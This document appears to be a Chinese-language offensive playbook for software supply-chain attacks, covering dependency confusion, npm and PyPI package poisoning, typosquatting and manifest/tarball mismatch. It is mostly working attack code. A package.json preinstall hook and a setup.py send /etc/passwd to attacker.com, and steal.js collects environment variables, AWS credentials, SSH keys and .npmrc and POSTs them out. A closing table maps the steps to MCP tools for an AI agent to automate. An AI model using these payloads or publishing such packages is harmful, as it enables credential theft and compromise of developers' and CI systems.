# Dependency Confusion & 供应链攻击

## 内部包名枚举

```python
# 探测目标公司使用的内部 npm/PyPI 包名
import requests, json

def enumerate_internal_packages(domain: str):
    """从公开信息枚举内部包名"""
    internal = []

    # 源 1: JS bundle 中 import 语句
    for js_file in ["/main.js", "/app.js", "/bundle.js", "/index.js"]:
        r = requests.get(f"https://{domain}/{js_file}")
        if r.status_code == 200:
            imports = re.findall(r'(?:import|require)\s*\(?["\']([@\w][^"\']+)["\']', r.text)
            for imp in imports:
                if not imp.startswith("@") or imp.startswith(f"@{domain.split('.')[0]}"):
                    internal.append(imp)

    # 源 2: package.json / package-lock.json 暴露
    for pkg_file in ["/package.json", "/package-lock.json"]:
        r = requests.get(f"https://{domain}/{pkg_file}")
        if r.status_code == 200:
            try:
                data = r.json()
                deps = {**data.get("dependencies", {}), **data.get("devDependencies", {})}
                for name in deps:
                    if "/" in name or name.startswith("@"):
                        internal.append(name)
            except: pass

    # 源 3: Source maps 中的 import
    # 源 4: GitHub 仓库中 .npmrc / .yarnrc 配置的 private registry scope

    return list(set(internal))
```

## NPM Registry 投毒

```python
# 发现内部包名 "internal-utils" (不在 public npm 上)
# 攻击者在 npm 发布同名包，版本号 > 内部版本

PACKAGE_SETUP = {
    "name": "internal-utils",
    "version": "99.0.0",      # >> 内部版本，优先被安装
    "description": "Utility library",
    "main": "index.js",
    "scripts": {
        "preinstall": "node -e 'require(\"child_process\").execSync(\"curl -d @/etc/passwd https://attacker.com/log\")'",
        "postinstall": "node steal.js"  # 更隐蔽: 读 ~/.aws/credentials
    },
    "files": ["index.js", "steal.js"],
}

# 发布:
# npm login
# npm publish --access public

# 下次 CI build → npm install → 优先拉攻击者的 99.0.0 → preinstall 执行
```

```javascript
// steal.js — npm install script payload
const fs = require('fs');
const os = require('os');
const { execSync } = require('child_process');

// 收集环境信息
const loot = {
    hostname: os.hostname(),
    user: os.userInfo().username,
    cwd: process.cwd(),
    env: process.env,
};

// 找敏感文件
['~/.aws/credentials', '~/.ssh/id_rsa', '~/.npmrc']
    .map(f => f.replace('~', os.homedir()))
    .forEach(f => {
        try { loot[f] = fs.readFileSync(f, 'utf-8').slice(0, 1000); } catch {}
    });

// 外带
require('https').request({hostname:'attacker.com',path:'/d',method:'POST',
    headers:{'Content-Type':'application/json'}}).end(JSON.stringify(loot));
```

## Manifest vs Tarball 不一致

```python
# npm registry metadata 中的 package.json ≠ tarball 中的 package.json
# npm install 执行的是 tarball 中的 scripts，而不是 registry 显示的

# 绕过审查:
# 1. 注册表上显示干净的 package.json (无 preinstall script)
# 2. tarball 内嵌的有 malicious preinstall
# 3. npm audit 检查 registry metadata → 安全
# 4. npm install 执行 tarball → 恶意代码运行
```

## Typosquatting

```python
# 常见 typosquat 变体
TYPOSQUAT_PATTERNS = lambda name: [
    name.replace("e", "ee"),           # "electron" → "electroon"
    name.replace("a", "ae"),           # "axios" → "aexios"
    name.replace("o", "0"),            # "lodash" → "l0dash"
    name.replace("l", "1"),            # "util" → "uti1"
    name + "-js",                      # "react" → "react-js"
    name + "-util",                    # "core" → "core-util"
    name.replace("-", ""),             # "node-fetch" → "nodefetch"
    name.replace("_", "-"),            # "lodash_utils" → "lodash-utils"
    name[::-1],                        # 反向 (如果短)
    name + "s",                        # "package" → "packages"
    "node-" + name,                    # "fetch" → "node-fetch"
]

# 批量检查这些名字是否在 npm 上不存在 → 抢占注册
```

## PyPI 攻击

```python
# PyPI 依赖混淆
# setup.py
from setuptools import setup
import os

# pre-install RCE
os.system("curl -d \"$(cat /etc/passwd)\" https://attacker.com/")

setup(
    name="internal-tool",
    version="99.0.0",
    packages=["internal_tool"],
    install_requires=[],  # 不引人注目
)
# python3 setup.py sdist
# twine upload dist/*
```

## 攻击链

```
Package name enum → npm publish → CI build → preinstall RCE → secrets 渗出
Dependency confusion → pip install → post-install → SSH key steal → infra 访问
Typosquat → 开发者输错包名 → 安装恶意包 → env steal → credential 泄露
Manifest/tarball 不一致 → 绕过 npm audit → CI 信任 → install RCE
```

## Evidence

记录: 枚举到的内部包名、发布的恶意包版本、CI runner 环境变量列表、外带的数据

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 依赖混淆探测 | `http_probe` | HTTP GET 探测包管理器注册表端点 |
| 知识检索 | `kb_router` | 按依赖混淆信号搜索知识库 |
